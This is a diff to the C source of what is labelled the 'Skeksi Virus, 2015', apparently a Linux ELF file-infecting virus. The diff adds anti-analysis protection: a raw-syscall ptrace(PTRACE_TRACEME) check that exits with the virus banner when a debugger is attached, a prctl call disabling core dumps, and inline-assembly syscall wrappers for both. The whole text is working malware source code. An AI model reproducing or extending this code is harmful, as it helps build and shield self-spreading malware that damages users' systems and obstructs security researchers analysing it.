@@ -49,6 +49,8 @@ int _strcmp(const char *, const char *);
 int _memcmp(const void *, const void *, unsigned int);
 
 /* syscalls */
+long _ptrace(long request, long pid, void *addr, void *data);
+int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
 int _fstat(long, void *);
 int _mprotect(void * addr, unsigned long len, int prot);
 long _lseek(long, long, unsigned int);
@@ -528,6 +530,14 @@ void do_main(struct bootstrap_data *bootstrap)
 	
 	load_self(&self);
 	
+#if ANTIDEBUG
+	if (_ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
+		_printf("!! Skeksi Virus, 2015 !!\n");
+		Exit(-1);
+	}
+	_prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
+#endif
+
 	for (;;) {
 		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 4096);
 		if (nread < 0) {
@@ -732,6 +742,37 @@ int _mprotect(void * addr, unsigned long len, int prot)
                         "syscall" : : "g"(addr), "g"(len), "g"(prot));
         asm("mov %%rax, %0" : "=r"(ret));
         
+        return (int)ret;
+}
+
+long _ptrace(long request, long pid, void *addr, void *data)
+{
+        long ret;
+
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov %3, %%r10\n"
+                        "mov $101, %%rax\n"
+                        "syscall" : : "g"(request), "g"(pid), "g"(addr), "g"(data));
+        asm("mov %%rax, %0" : "=r"(ret));
+        
+        return ret;
+}
+
+int _prctl(long option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5)
+{
+        long ret;
+        
+        __asm__ volatile(
+                        "mov %0, %%rdi\n"
+                        "mov %1, %%rsi\n"
+                        "mov %2, %%rdx\n"
+                        "mov %3, %%r10\n"
+                        "mov $157, %%rax\n"
+                        "syscall\n" :: "g"(option), "g"(arg2), "g"(arg3), "g"(arg4), "g"(arg5));
+        asm("mov %%rax, %0" : "=r"(ret));
         return (int)ret;
 }
 
